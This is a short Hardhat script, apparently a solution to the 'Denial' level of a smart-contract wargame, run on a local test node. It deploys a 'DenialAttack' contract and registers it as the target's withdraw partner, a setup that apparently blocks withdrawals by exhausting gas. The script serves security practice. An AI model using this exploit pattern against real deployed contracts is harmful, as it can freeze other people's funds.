import { ethers } from "hardhat";

//Fit player address chosen from hardhat node addresses and contract address (current lvl instance)
const PLAYER_ADDRESS = "0x9965507D1a55bcC2695C58ba16FB37d819B0A4dc";
const CONTRACT_ADDRESS = "0xeF8653ffb270961153fC955063ABc1AeAe0Cc37b";

async function main() {
const signer = await ethers.getSigner(PLAYER_ADDRESS);
const contract = await ethers.getContractAt("Denial", CONTRACT_ADDRESS, signer);

const attackerContractFactory = await ethers.getContractFactory("DenialAttack", signer);
const attackerContract = await attackerContractFactory.deploy();

//HACK STEPS

// 1. Check balance of contract
let balance = await contract.contractBalance();
console.log("Contract balance(eth) is: ", ethers.utils.formatEther(balance));


// 2. Place our attacker contract as partner. 
console.log("Partner is: ", await contract.partner());
console.log("Attacker contract address: ", attackerContract.address);
await contract.setWithdrawPartner(attackerContract.address);
console.log("Partner is now : ", await contract.partner());

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
